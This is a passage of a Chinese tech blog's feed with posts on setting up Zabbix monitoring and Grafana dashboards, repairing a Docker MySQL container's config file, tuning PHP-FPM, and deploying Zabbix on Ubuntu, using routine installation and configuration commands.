&lt;p&gt;问题描述：因为错误的配置文件导致容器运行异常，无法正常启动，通常情况下只有进入容器才能修改配置文件，所以在不能进入容器的情况下该怎么办呢？&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Docker" scheme="https://www.0x2beace.com/categories/Linux/Docker/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Docker" scheme="https://www.0x2beace.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Zabbix 快速上手——添加监控项</title>
    <link href="https://www.0x2beace.com/zabbix-quick-start-add-monitoring-items/"/>
    <id>https://www.0x2beace.com/zabbix-quick-start-add-monitoring-items/</id>
    <published>2020-09-09T13:50:15.000Z</published>
    <updated>2020-09-09T13:51:50.880Z</updated>
    
    <content type="html"><![CDATA[<p>在Zabbix 默认的监控项中，唯独没有网络状态的监控，而网络状况的监控又是我最关心的，所以需要自己手动添加。</p><p>下面介绍的方式仅适合主机数量不多的情况手动添加，如果主机数量很多，使用这种方式会很繁琐低效。</p><a id="more"></a><p>至于更好的方式是怎样的，暂时还没有发现。</p><h2 id="添加监控项"><a href="#添加监控项" class="headerlink" title="添加监控项"></a>添加监控项</h2><p>打开<code>Configuration-&gt;Hosts</code> 主机页面，点击需要监控项的主机的 <code>Application</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908202935.png" alt=""></p><p>在<code>Application</code>列表中，如果没有看到 <code>Network interfaces</code>这一项，那么可以点击右上角的<code>Create Appliction</code>自己创建。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908203206.png" alt=""></p><p>创建完成之后，<code>items</code> 默认是没有的，需要我们自己添加，继续点击<code>items-&gt;create items</code>。</p><p>接下来是最重要的一步，添加监控项的具体信息。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908203720.png" alt=""></p><p>需要注意的地方有下面几个：</p><ul><li>Name：自定义该项监控的名称</li><li>Key：<code>net.if.in[eth0,bytes]</code>，其中<code>eth0</code>并不是固定的，这个具体的值是被监控得主机得实际网卡。</li><li>Units：<code>bps</code></li><li>Update interval：自动更新时间，这个可以自定义。</li><li>Applications：选择 <code>Network interfaces</code></li></ul><blockquote><p>如何确定网卡地址？</p></blockquote><p>进入服务器，输入<code>ifconfig</code>命令查看，通常排在最前面得就是实际网卡。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908205948.png" alt=""></p><p>完成之后，点击<code>Add</code>添加监控项。</p><p>如果一切顺利的话，可以在刚才添加的监控项列表中看到监控项状态是启用的。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908204614.png" alt=""></p><p>这个时候已经可以看到该监控项相关的数据了，如果希望在Grafana 中展示，那么只需要在选择Application时，选择<code>Network interfaces</code>就好了。</p><p>结合Grafana，最后的效果大概是这样：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908205451.png" alt=""></p><p>这里只是举了一个典型的例子来了解Zabbix 如何手动添加监控项，其他类型的数据也是通过类似的方式进行添加。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/smail-bao/p/6109882.html" target="_blank" rel="noopener">zabbix监控网络的出入口流量</a></li><li><a href="https://pdf-lib.org/Home/Details/3901" target="_blank" rel="noopener">Cannot find information for this network interface in /proc/net/dev</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在Zabbix 默认的监控项中，唯独没有网络状态的监控，而网络状况的监控又是我最关心的，所以需要自己手动添加。&lt;/p&gt;
&lt;p&gt;下面介绍的方式仅适合主机数量不多的情况手动添加，如果主机数量很多，使用这种方式会很繁琐低效。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Zabbix" scheme="https://www.0x2beace.com/categories/Linux/Zabbix/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Zabbix" scheme="https://www.0x2beace.com/tags/Zabbix/"/>
    
  </entry>
  
  <entry>
    <title>Zabbix + Grafana 打造高颜值的分布式监控平台</title>
    <link href="https://www.0x2beace.com/zabbix-grafana-to-create-a-high-value-distributed-monitoring-platform/"/>
    <id>https://www.0x2beace.com/zabbix-grafana-to-create-a-high-value-distributed-monitoring-platform/</id>
    <published>2020-09-08T13:08:25.000Z</published>
    <updated>2020-09-08T13:09:34.991Z</updated>
    
    <content type="html"><![CDATA[<p>在前面了解了如何部署 Zabbix，众所周知Zabbix 的部署并不是难的部分，配置才是最难的那部分。</p><p>所以如何获取到想要的那部分数据，将那部分数据以更直观的方式展现出来，这才是我们更关心的。</p><p>Zabbix 默认有自己的 Graphs，但是并不好用，所以使用Zabbix + Grafana 打造高颜值的分布式监控平台才是最好的选择。</p><a id="more"></a><h2 id="Grafana-是什么？"><a href="#Grafana-是什么？" class="headerlink" title="Grafana 是什么？"></a>Grafana 是什么？</h2><blockquote><p>Grafana是一个跨平台的开源度量分析和可是化的工具，可以通过该将采集的数据查询然后可视化的展示，并及时通知。</p></blockquote><p>Grafana 有以下特点：</p><ol><li>展示方式：快速灵活的客户端图表，面板插件有许多不同方式的可视化指标和日志，官方库中具有丰富的仪表盘插件，比如热图、折线图、图表等多种展示方式.</li><li>数据源：Graphite、InfluxDB、OpenTSDB、Prometheus、Elasticsearch、CloudWatch和KairosDb、Zabbix等。</li><li>通知提醒：以可视方式定义最重要指标的报警规则，Grafana将不断计算并发送通知，在数据达到预设阈值时通过slack，PagerDuty等处理通知。</li><li>混合展示：在同一图表中混合使用不同的数据源，可以基于每个查询指定数据源，甚至自定义数据源。</li><li>注释：使用来自不同数据源的丰富事件来展示图表，将鼠标悬停在事件上会显示完整的事件元数据和标记。</li><li>过滤器：Ad-hoc过滤器允许动态创建新的键/值过滤器，这些过滤器会自动应用于使用该数据源的所有查询。</li></ol><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Grafana 的安装还是建议根据自己实际的系统环境去<a href="https://grafana.com/grafana/download/7.0.0" target="_blank" rel="noopener">官网</a>选择适合自己的下载链接。</p><p>比如我的环境是 Ubuntu 18.04，我想安装 Grafana 7.0，所以我的安装方式应该是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install -y adduser libfontconfig1</span><br><span class="line">$ wget https:&#x2F;&#x2F;dl.grafana.com&#x2F;oss&#x2F;release&#x2F;grafana_7.0.0_amd64.deb</span><br><span class="line">$ sudo dpkg -i grafana_7.0.0_amd64.deb</span><br></pre></td></tr></table></figure><h3 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h3><p>以守护进程的方式启动 <code>grafana-server</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo systemctl daemon-reload</span><br><span class="line">$ sudo systemctl start grafana-server</span><br></pre></td></tr></table></figure><p>设置开机启动：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo systemctl enable grafana-server.service</span><br></pre></td></tr></table></figure><p>查看 <code>grafana-server</code>所监听的端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo netstat -lntp</span><br><span class="line">tcp6       0      0 :::3000                 :::*                    LISTEN      17194&#x2F;grafana-serve</span><br></pre></td></tr></table></figure><p>3000 是Grafana 默认监听端口，然后通过浏览器访问 <code>http://your_ip_address:3000</code> 即可。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200907174006.png" alt=""></p><p>正常应该可以看到该页面，如果你能看到3000 端口被监听，但是页面一直打不开，那可能是因为防火墙没有允许3000 端口。</p><p>默认的用户名和密码都是：admin，登录之后记得第一时间修改默认密码。</p><h3 id="安装Zabbix-插件"><a href="#安装Zabbix-插件" class="headerlink" title="安装Zabbix 插件"></a>安装Zabbix 插件</h3><p>打开Grafana 的插件列表，找到<a href="https://grafana.com/grafana/plugins/alexanderzobnin-zabbix-app" target="_blank" rel="noopener">Zabbix</a>。</p><p>这里根据实实际情况，选择对应的版本。</p><p>通过<code>grafana-cli</code> 安装zabbix 插件，将下面这行代码放在安装了 Grafana 的服务器上执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ grafana-cli plugins install alexanderzobnin-zabbix-app</span><br><span class="line">✔ Installed alexanderzobnin-zabbix-app successfully</span><br></pre></td></tr></table></figure><p>安装完成之后，重启Grafana：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo systemctl restart grafana-server</span><br></pre></td></tr></table></figure><p>然后打开Grafana 的Web 界面，在插件列表中找到 Zabbix。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200907175149.png" alt=""></p><p>点击启用。</p><h3 id="add-data-source"><a href="#add-data-source" class="headerlink" title="add data source"></a>add data source</h3><p>自从 Grafana 7.0 以后，没有签名的插件默认在 datasource 中是不可见的…</p><p>坑啊，最初我安装的是 Zabbix5.0，然后看见Grafana 7.0 好像只适配4.0，心想完了，该不会出现什么版本不兼容的问题吧？</p><p>结果在<code>add data source</code>这一步，一直找不到 zabbix…</p><p>然后今天把5.0 完全卸载了，重新装回了4.0，结果到了<code>add data source</code>这一步才发现，还是找不到zabbix，当时心态就崩了…</p><p>直到我看见<a href="https://sbcode.net/zabbix/grafana-zabbix-plugin/" target="_blank" rel="noopener">这篇文章</a>，这么重要的信息，官方文档中居然没记录。</p><p>如果你无法访问，也可以直接进行修改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;grafana&#x2F;grafana.ini</span><br><span class="line"></span><br><span class="line"># 添加一行</span><br><span class="line">allow_loading_unsigned_plugins &#x3D; alexanderzobnin-zabbix-datasource</span><br></pre></td></tr></table></figure><p>然后重启Grafana：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo systemctl restart grafana-server</span><br></pre></td></tr></table></figure><p>再次打开Web 页面，现在就能找到 Zabbix 了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200907181658.png" alt=""></p><h3 id="配置-data-source"><a href="#配置-data-source" class="headerlink" title="配置 data source"></a>配置 data source</h3><p>只用修改以下四个地方就好了，然后点击保存。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200907203549.png" alt=""></p><h3 id="add-dashboard"><a href="#add-dashboard" class="headerlink" title="add dashboard"></a>add dashboard</h3><p>依次点击<code>add dashboard-&gt; add new panel</code>，然后按照以下方式配置，就可以选择展示自己想要的数据了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200907204758.png" alt=""></p><p>最后的效果：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200907204326.png" alt=""></p><p>这里只是介绍了 Zabbix + Grafana 最基础的用法，能看到的数据也是最简单的一些，如果想看到更多的数据，那就得更加了解 Zabbix 了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在前面了解了如何部署 Zabbix，众所周知Zabbix 的部署并不是难的部分，配置才是最难的那部分。&lt;/p&gt;
&lt;p&gt;所以如何获取到想要的那部分数据，将那部分数据以更直观的方式展现出来，这才是我们更关心的。&lt;/p&gt;
&lt;p&gt;Zabbix 默认有自己的 Graphs，但是并不好用，所以使用Zabbix + Grafana 打造高颜值的分布式监控平台才是最好的选择。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Zabbix" scheme="https://www.0x2beace.com/categories/Linux/Zabbix/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Zabbix" scheme="https://www.0x2beace.com/tags/Zabbix/"/>
    
  </entry>
  
  <entry>
    <title>当 Docker 容器无法正常启动时如何修改配置文件？</title>
    <link href="https://www.0x2beace.com/how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally/"/>
    <id>https://www.0x2beace.com/how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally/</id>
    <published>2020-09-07T00:13:24.000Z</published>
    <updated>2020-09-07T00:14:53.536Z</updated>
    
    <content type="html"><![CDATA[<p>在容器无法正常启动的情况下，如何修改其配置文件？</p><a id="more"></a><p>问题描述：因为错误的配置文件导致容器运行异常，无法正常启动，通常情况下只有进入容器才能修改配置文件，所以在不能进入容器的情况下该怎么办呢？</p><p>这种情况下，有两种方式去修改：<br>2. Docker 容器的配置文件一般在 <code>/var/lib/docker/overlay/</code>目录下，可以找到该目录下对应的配置文件进行修改。<br>2. 把容器中的配置文件复制到主机中，修改完之后，再移动到容器中。</p><h2 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h2><ol><li><p>查询日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker logs &lt;容器名称&#x2F;容器id&gt;</span><br><span class="line"></span><br><span class="line">ERROR: mysqld failed while attempting to check config</span><br><span class="line">command was: &quot;mysqld --verbose --help&quot;</span><br><span class="line">2020-09-03T12:15:54.644699Z 0 [ERROR] unknown variable &#39;realy-log&#x3D;slave-relay-bin&#39;</span><br><span class="line">2020-09-03T12:15:54.650119Z 0 [ERROR] Aborting</span><br></pre></td></tr></table></figure><p>由于异常日志可以得知是因为我将<code>relay-log</code> 写成了 <code>realy</code> 导致容器无法正常启动。</p></li><li><p>查找文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ find &#x2F; -name mysqld.cnf</span><br><span class="line"></span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;merged&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;4f128d7fb1200f722b0d2cfe3606149fe72987a7a16bc78551a2b1fe6c6c6572&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;a68f1af4adf982b037f1bd37d61082fde1fa2b0e26ea0e2fe146edcb69b198ea&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure><p>这里可能会出现多个配置文件，这是因为每一次重启Mysql 容器都会保留一个配置文件，所以理论上，直接修改第一个配置文件，就是当前Mysql 所使用的配置文件。</p></li><li><p>修改配置文件</p></li><li><p>重启容器即可。</p></li></ol><h2 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h2><p>如果第一种方式没生效，那可以尝试第二种方式。</p><ol><li><p>复制容器中的配置文件到主机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 语法：docker cp &lt;容器名称&#x2F;容器id&gt;:&lt;配置文件在容器中的路径&gt; &lt;需要复制到主机的路径&gt;</span><br><span class="line"></span><br><span class="line">$ docker cp mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf ~&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure></li><li><p>修改主机中的配置文件</p></li><li><p>将该配置文件mv 到容器中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 语法：docker cp &lt;配置文件在主机中的路径&gt; &lt;容器名称&#x2F;容器id&gt;:&lt;配置文件在容器中的路径&gt;</span><br><span class="line"></span><br><span class="line">$ docker cp ~&#x2F;mysqld.cnf mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure></li><li><p>重启配置文件即可。</p></li></ol><p>总结：两种方式均可以有效解决上述问题，当然这类方式仅适用于容器是因错误的配置文件导致无法正常启动的情况。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/LinHenk/article/details/88111616" target="_blank" rel="noopener">Docker修改无法启动的容器的配置文件</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在容器无法正常启动的情况下，如何修改其配置文件？&lt;/p&gt;</summary>
    
    
    
    <category term="Docker" scheme="https://www.0x2beace.com/categories/Docker/"/>
    
    
    <category term="Docker" scheme="https://www.0x2beace.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>PHP-FPM 配置初始化</title>
    <link href="https://www.0x2beace.com/php-fpm-configuration-initialization/"/>
    <id>https://www.0x2beace.com/php-fpm-configuration-initialization/</id>
    <published>2020-09-06T03:57:11.000Z</published>
    <updated>2020-09-06T04:05:33.658Z</updated>
    
    <content type="html"><![CDATA[<p><code>php-fpm</code>（FastCGI Process Manger）是一个PHP FastCGI 管理器，专门和Nginx 的 <code>ngx_fastcgi_modul</code>模块对接，用来处理动态请求。</p><a id="more"></a><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>当安装了PHP 之后，可以从以下三个方向来对默认配置进行修改，以达到优化的效果。</p><h3 id="1-核心配置文件"><a href="#1-核心配置文件" class="headerlink" title="1. 核心配置文件"></a>1. 核心配置文件</h3><p>核心配置文件其实就是 <code>php.ini</code>，该配置文件的作用通常是用来启用或禁用第三方模块，及修改PHP 时区等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.ini</span><br><span class="line"></span><br><span class="line">date.timezone &#x3D; Asia&#x2F;Shanghai</span><br></pre></td></tr></table></figure><h3 id="2-全局配置文件"><a href="#2-全局配置文件" class="headerlink" title="2. 全局配置文件"></a>2. 全局配置文件</h3><p>全局配置文件<code>php-fpm.conf</code>，通常用来配置一些辅助性功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.conf</span><br><span class="line"></span><br><span class="line">error_log &#x3D; &#x2F;var&#x2F;log&#x2F;php-fpm&#x2F;error.log</span><br><span class="line">log_level &#x3D; notice</span><br><span class="line">;process_max &#x3D; 0</span><br><span class="line">deamonize &#x3D; yes</span><br></pre></td></tr></table></figure><p>参数解析：</p><ul><li><code>error_log</code>：错误日志路径</li><li><code>log_level</code>：日志级别，默认为notice<ul><li><code>alert</code>：必须立即处理</li><li><code>error</code>：错误情况</li><li><code>warning</code>：警告情况</li><li><code>notice</code>：一般重要信息</li><li><code>debug</code>：调试信息</li></ul></li><li><code>process_max</code>：控制最大子进程数的全局变量，不建议设置具体数量，因为会限制扩展配置。</li><li><code>daemonize</code>：是否开启守护进程，默认为yes</li></ul><p>通常不会在<code>php-fpm.conf</code>中设定 <code>process_max</code>，因为会限制<code>www.conf</code>中的配置。</p><h3 id="3-扩展配置文件"><a href="#3-扩展配置文件" class="headerlink" title="3. 扩展配置文件"></a>3. 扩展配置文件</h3><p>扩展配置文件<code>www.conf</code>通常是与<code>php-fpm</code>服务相关的配置，大部分优化都是需要更改这个配置文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.d&#x2F;www.conf</span><br><span class="line"></span><br><span class="line">listen &#x3D; 127.0.0.1:9000</span><br><span class="line">slowlog &#x3D; &#x2F;var&#x2F;log&#x2F;php-fpm&#x2F;www-slow.log</span><br><span class="line"></span><br><span class="line"># 这里按照10G 的空闲内存去设定</span><br><span class="line">pm &#x3D; dynamic</span><br><span class="line">pm.start_servers &#x3D; 16</span><br><span class="line">pm.max_children &#x3D; 256</span><br><span class="line">pm.min_spare_servers &#x3D; 16</span><br><span class="line">pm.max_spare_servers &#x3D; 32</span><br><span class="line">pm.max_requests &#x3D; 1000</span><br></pre></td></tr></table></figure><p>参数解析：</p><ul><li><code>listen</code>：有两种方式可以进行通讯。<ul><li><code>socket</code>：<code>unix:/run/php/php7.3-fpm.sock</code></li><li><code>http</code>：<code>127.0.0.1:9000</code> 因为<code>php-fpm</code>与<code>ngx_fastcgi_modul</code>的通讯方式是 9000端口，所以默认是 <code>127.0.0.1:9000</code></li></ul></li><li><code>slowlog</code>：慢查询日志路径</li><li><code>pm</code>：进程管理方式<ul><li><code>static</code>：静态模式。始终保持固定数量的子进程数，配合最大子进程数一起使用，这个方式很不灵活，通常不是默认。<ul><li><code>pm.max_children</code>：最大子进程数。</li></ul></li><li><code>dynamic</code>：动态模式。按照固定的最小子进程数启动，同时用最大子进程数去限制。<ul><li><code>pm.start_servers</code>：默认开启的进程数</li><li><code>pm.min_spare_servers</code>：最小空闲的进程数</li><li><code>pm.max_spare_servers</code>：最大空闲的进程数</li><li><code>pm.max_children</code>：最大子进程数</li><li><code>pm.max_requests</code>：每个进程能响应的请求数量，达到此限制之后，该PHP 进程就会被自动释放掉。</li></ul></li><li><code>nodaemonize</code>：每个进程在闲置一定时候后就会被杀掉。<ul><li><code>pm.max_children</code>：最大子进程数</li><li><code>pm.process_idle_timeout</code>：在多少秒之后，一个空闲的进程将会被杀死</li></ul></li></ul></li></ul><p>注意：<code>max_children</code> 是 PHPFPM Pool 最大的子进程数，它的数值取决于服务器实际空闲内存。假设你有一台10G 运行内存的服务器，我们知道一个空闲的PHP 进程占用的是 1M 内存，而一个正在处理请求的PHP 进程 大概会占用<code>10M-40M</code>内存，这里按照每个PHP 请求占用 40M 内存，那么<code>max_children = 10*1024M/40M = 256</code>，所以这个值得根据实际环境而设定。</p><p>以上就是<code>php-fpm</code> 初始化配置的核心部分了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;code&gt;php-fpm&lt;/code&gt;（FastCGI Process Manger）是一个PHP FastCGI 管理器，专门和Nginx 的 &lt;code&gt;ngx_fastcgi_modul&lt;/code&gt;模块对接，用来处理动态请求。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="PHP-FPM" scheme="https://www.0x2beace.com/tags/PHP-FPM/"/>
    
  </entry>
  
  <entry>
    <title>Zabbix 快速上手——部署</title>
    <link href="https://www.0x2beace.com/zabbix-quick-start/"/>
    <id>https://www.0x2beace.com/zabbix-quick-start/</id>
    <published>2020-09-05T00:49:02.000Z</published>
    <updated>2020-09-09T13:49:09.649Z</updated>
    
    <content type="html"><![CDATA[<p>因为一些特殊原因，部分环境不是搭建在云上面，而是在托管的实体机上面，这就导致原本很多云可以帮我们做的事情，现在只能自己去做了。<br>比如：监控系统。</p><p>本着<strong>不想当运维的前端不是一个好全栈</strong>的思想，我迫切需要自己搭建一套完整的监控系统来解放自己的双手👐️。</p><a id="more"></a><p>我希望这套监控系统是怎样的？</p><ol><li>免费开源</li><li>入门相对容易</li><li>支持多平台分布式监控</li></ol><p>综合以上需求，最后我选择了 <a href="https://www.zabbix.com/" target="_blank" rel="noopener">Zabbix</a> 。</p><p>网上找了一圈，并没有发现合适的入门教程，要么是教程太老了，要么是写的不够详细，学习曲线很陡，光是部署就很费劲，而Zabbix 重要的不是部署，而是学会如何使用。</p><p>所以这篇笔记就是用来记录如何快速部署 Zabbix。</p><h2 id="认识-Zabbix"><a href="#认识-Zabbix" class="headerlink" title="认识 Zabbix"></a>认识 Zabbix</h2><p><a href="https://www.zabbix.com/" target="_blank" rel="noopener">Zabbix</a> 是一个企业级的分布式开源监控方案。</p><p>一个完整的监控系统是由服务机（zabbix server）和客户机（zabbix zgent）组成，运行大概流程是这样的：<br> <code>zabbix agent</code> 需要安装到被监控的主机上，它负责定期收集各项数据，并发送到 <code>zabbix server</code> 端，zabbix server将数据存储到自己的数据库中，<code>zabbix web</code>根据数据在前端进行展现和绘图。这里 agent 收集数据分为主动和被动两种模式：</p><ul><li>主动：agent 请求server 获取主动的监控项列表，并主动将监控项内需要检测的数据提交给 server/proxy 。</li><li>被动：server 向agent请求获取监控项的数据，agent返回数据。</li></ul><p>工作原理：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200905083643.png" alt=""></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>系统环境：</p><ul><li>Ubuntu 18.04 LTS</li><li>Mysql 5.7</li><li>PHP 7.2</li><li>Nginx </li><li>Zabbix 5.0</li></ul><h3 id="1-安装数据库"><a href="#1-安装数据库" class="headerlink" title="1. 安装数据库"></a>1. 安装数据库</h3><p>在正式安装之前，这里推荐先去<a href="https://www.zabbix.com/cn/download" target="_blank" rel="noopener">官网</a>找到符合自己的 Zabbix 服务器平台。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200902093733.png" alt=""></p><p>根据自己的实际环境来找到属于自己的下载链接，比如我是<code>Zabbix 5.0 + Ubuntu 18.04 + Mysql + Nginx</code>，所以我的安装方式应该是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ wget https:&#x2F;&#x2F;repo.zabbix.com&#x2F;zabbix&#x2F;5.0&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;z&#x2F;zabbix-release&#x2F;zabbix-release_5.0-1+bionic_all.deb</span><br><span class="line">$ dpkg -i zabbix-release_5.0-1+bionic_all.deb</span><br><span class="line">$ apt update</span><br></pre></td></tr></table></figure><h3 id="2-安装Zabbix-server，Web前端，agent"><a href="#2-安装Zabbix-server，Web前端，agent" class="headerlink" title="2. 安装Zabbix server，Web前端，agent"></a>2. 安装Zabbix server，Web前端，agent</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt install zabbix-server-mysql zabbix-frontend-php zabbix-nginx-conf zabbix-agent</span><br></pre></td></tr></table></figure><ul><li>Zabbix Server：用来接收并处理 Zabbix agent 传过来的数据</li><li>Web 前端：Zabbix 的交互界面</li><li>Zabbix agent：需要被监控的主机</li></ul><h3 id="3-初始数据库"><a href="#3-初始数据库" class="headerlink" title="3. 初始数据库"></a>3. 初始数据库</h3><p>安装完数据库之后，并不能直接登录，因为不知道root 用户的密码，所以需要重置root 用户的密码，重置的方式有多种，这里推荐我常使用的的一种。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># vim &#x2F;etc&#x2F;mysql&#x2F;conf.d&#x2F;mysql.conf  </span><br><span class="line"># 也许你编辑的配置文件和我的名称不一样，不过没关系。</span><br><span class="line"></span><br><span class="line"># 添加下面两行配置</span><br><span class="line">[mysqld]</span><br><span class="line">skip-grant-tables</span><br></pre></td></tr></table></figure><p>重启Mysql 服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ service mysql restart</span><br></pre></td></tr></table></figure><p>现在的root 用户已经没有密码了，所以下一步要做的就是修改root 用户密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -hlocalhost -uroot -p</span><br><span class="line"></span><br><span class="line">mysql &gt; UPDATE mysql.user SET authentication_string&#x3D;PASSWORD(&#39;password&#39;), 